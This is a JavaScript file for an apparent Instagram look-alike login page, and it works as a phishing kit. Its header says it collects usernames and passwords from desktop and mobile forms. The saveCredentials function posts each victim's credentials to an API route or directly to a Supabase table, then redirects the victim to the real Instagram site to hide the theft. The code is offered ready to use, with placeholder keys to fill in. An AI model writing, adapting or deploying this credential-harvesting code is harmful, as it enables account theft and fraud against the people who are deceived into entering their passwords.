/*
    Collects username + password from both desktop and mobile forms
    and sends them to your API / Supabase
*/

const SUPABASE_URL = "YOUR_SUPABASE_URL";          // replace
const SUPABASE_ANON_KEY = "YOUR_SUPABASE_ANON_KEY"; // replace (or use API route)

// ========== DESKTOP FORM ==========
const loginForm = document.getElementById("demoLoginForm");

if (loginForm) {
  loginForm.addEventListener("submit", async function (event) {
    event.preventDefault();

    const user_id = document.getElementById("usernameInput").value.trim();
    const pass = document.getElementById("passwordInput").value;

    if (!user_id || !pass) {
      alert("Please enter both username and password");
      return;
    }

    await saveCredentials(user_id, pass, "desktop");

    // After saving, redirect (optional)
    window.location.href = "https://www.instagram.com/";
  });
}

// ========== MOBILE FORM ==========
const mobileLoginForm = document.getElementById("mobileLoginForm");

if (mobileLoginForm) {
  mobileLoginForm.addEventListener("submit", async function (event) {
    event.preventDefault();

    const user_id = document.getElementById("mobileUsernameInput").value.trim();
    const pass = document.getElementById("mobilePasswordInput").value;

    if (!user_id || !pass) {
      alert("Please enter both username and password");
      return;
    }

    await saveCredentials(user_id, pass, "mobile");

    // After saving, redirect (optional)
    window.location.href = "https://www.instagram.com/";
  });
}

// ========== SAVE FUNCTION ==========
async function saveCredentials(user_id, pass, source) {
  try {
    // OPTION A: Call your Vercel API route (recommended)
    const response = await fetch("/api/save-login", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        user_id,
        pass,
        source, // optional
      }),
    });

    const result = await response.json();
    console.log("Saved:", result);

    // OPTION B: Direct to Supabase (uncomment if you prefer)
    /*
    const response = await fetch(`${SUPABASE_URL}/rest/v1/your_table_name`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "apikey": SUPABASE_ANON_KEY,
        "Authorization": `Bearer ${SUPABASE_ANON_KEY}`,
        "Prefer": "return=minimal"
      },
      body: JSON.stringify({
        user_id,
        pass
      })
    });
    */
  } catch (error) {
    console.error("Error saving:", error);
  }
}

// ========== REST OF YOUR ORIGINAL CODE (mobile overlay etc.) ==========

const forgotPassword = document.getElementById("forgotPassword");
if (forgotPassword) {
  forgotPassword.addEventListener("click", function () {
    window.location.href = "https://www.instagram.com/accounts/password/reset/";
  });
}

const createAccount = document.getElementById("createAccount");
if (createAccount) {
  createAccount.addEventListener("click", function () {
    window.location.href = "https://www.instagram.com/accounts/emailsignup/";
  });
}

const facebookButton = document.getElementById("facebookButton");
if (facebookButton) {
  facebookButton.addEventListener("click", function () {});
}

const languageButton = document.getElementById("languageButton");
if (languageButton) {
  languageButton.addEventListener("click", function () {});
}

const mobileOpenInstagram = document.getElementById("mobileOpenInstagram");
const mobileOpenTop = document.getElementById("mobileOpenTop");

function showOpenAppMessage() {}

if (mobileOpenInstagram) {
  mobileOpenInstagram.addEventListener("click", showOpenAppMessage);
}
if (mobileOpenTop) {
  mobileOpenTop.addEventListener("click", showOpenAppMessage);
}

const mobileLogin = document.getElementById("mobileLogin");
const mobileTopLogin = document.getElementById("mobileTopLogin");
const mobileLoginOverlay = document.getElementById("mobileLoginOverlay");
const closeMobileLogin = document.getElementById("closeMobileLogin");

function openMobileLogin() {
  if (mobileLoginOverlay) {
    mobileLoginOverlay.classList.add("active");
    document.body.style.overflow = "hidden";
  }
}

function closeMobileLoginBox() {
  if (mobileLoginOverlay) {
    mobileLoginOverlay.classList.remove("active");
    document.body.style.overflow = "";
  }
}

if (mobileLogin) mobileLogin.addEventListener("click", openMobileLogin);
if (mobileTopLogin) mobileTopLogin.addEventListener("click", openMobileLogin);
if (closeMobileLogin) closeMobileLogin.addEventListener("click", closeMobileLoginBox);

if (mobileLoginOverlay) {
  mobileLoginOverlay.addEventListener("click", function (event) {
    if (event.target === mobileLoginOverlay) {
      closeMobileLoginBox();
    }
  });
}

const mobileForgot = document.getElementById("mobileForgot");
if (mobileForgot) {
  mobileForgot.addEventListener("click", function () {
    window.location.href = "https://www.instagram.com/accounts/password/reset/";
  });
}

const mobileSignup = document.getElementById("mobileSignup");
if (mobileSignup) {
  mobileSignup.addEventListener("click", function () {});
}

const mobileLanguage = document.getElementById("mobileLanguage");
if (mobileLanguage) {
  mobileLanguage.addEventListener("click", function () {
    alert("Language selector — demo only.");
  });
}
